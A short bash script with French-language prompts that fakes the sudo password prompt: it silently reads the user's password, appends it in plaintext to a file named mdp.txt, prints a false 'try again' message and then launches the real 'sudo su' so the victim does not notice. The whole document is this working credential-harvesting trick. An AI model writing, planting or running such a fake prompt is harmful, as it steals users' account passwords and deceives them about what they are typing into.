#!/bin/bash

name=$(whoami)
read -s -p "[sudo] Mot de passe de $name : " mdp
echo "$mdp" >> mdp.txt
echo -e "\nDésolé, essayez de nouveau."
sudo su

